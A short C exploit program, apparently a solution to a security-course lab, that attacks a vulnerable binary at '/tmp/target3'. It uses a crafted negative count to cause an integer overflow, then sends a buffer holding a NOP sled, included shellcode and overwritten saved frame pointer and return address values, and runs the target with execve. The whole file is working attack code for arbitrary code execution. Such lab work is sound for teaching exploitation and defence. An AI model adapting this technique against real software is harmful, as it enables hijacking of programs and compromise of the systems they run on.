#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
int main(void)
{
  char *args[3];
  char *env[1];

  int bufferSize = 12 + 160*16+8 + 1;
  char buffer[bufferSize];

  int i;
  for (i = 0; i < bufferSize; i++) { buffer[i] = 0x90; } //NOPS

  
  strncpy(buffer, "-2147483487,", 12); //count

  strcpy(buffer + 12 + 160 * 16 - 45, shellcode);
  long* tmp = (long*)(buffer + 2572); // 12+160*16
  *tmp = 0xbffff478; // sfp
  tmp = (long*)(buffer + 2572+4);
  *tmp = 0xbfffea48; // return add
  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
